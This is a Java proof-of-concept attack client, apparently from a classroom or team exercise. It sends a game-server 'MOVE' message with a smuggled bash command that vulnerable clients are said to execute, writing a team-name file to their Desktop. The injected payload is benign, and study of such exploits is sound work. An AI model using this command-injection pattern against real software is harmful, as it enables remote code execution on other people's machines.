import java.io.*;
import java.net.*;

public class AttackClient {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;
    
    public static void main(String[] args) {
        
        System.out.println("=== ATTACK CLIENT ===");
        System.out.println("Connecting to server...");
        
        try (
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(socket.getInputStream())
            );
            PrintWriter out = new PrintWriter(
                socket.getOutputStream(), true
            )
        ) {
            // Read server prompt
            String prompt = in.readLine();
            System.out.println("Server: " + prompt);
            
            // Send attacker name
            String attackerName = "GameMaster";
            out.println(attackerName);
            System.out.println("Connected as: " + attackerName);
            
            // Wait for connection to establish
            Thread.sleep(1000);
            
            // Craft the malicious payload
            String payload = craftMaliciousPayload();
            
            System.out.println("\n[*] Sending malicious payload...");
            System.out.println("[*] Payload: " + payload);
            
            // Send the payload
            out.println(payload);
            
            System.out.println("[*] Payload sent!");
            System.out.println("[*] All connected vulnerable clients should now have the file on their Desktop");
            
            // Keep connection alive briefly
            Thread.sleep(3000);
            
            System.out.println("[*] Attack complete. Disconnecting...");
            
        } catch (Exception e) {
            System.err.println("[ERROR] Attack failed:");
            e.printStackTrace();
        }
    }
    
    private static String craftMaliciousPayload() {
        String teamName = "HackingTeam";
        String members = "Chris, Kylie, Hanuel, Amy";
        
        // Create the bash command to write the file
        String bashCommand = String.format(
            "echo -e 'Team: %s\\nMembers: %s\\nTimestamp: '$(date) > ~/Desktop/%s.txt",
            teamName,
            members,
            teamName
        );
        
        // Wrap it in a MOVE command with fake coordinates
        // The server will broadcast this, and vulnerable clients will execute it
        return "MOVE:100,200; " + bashCommand;
    }
}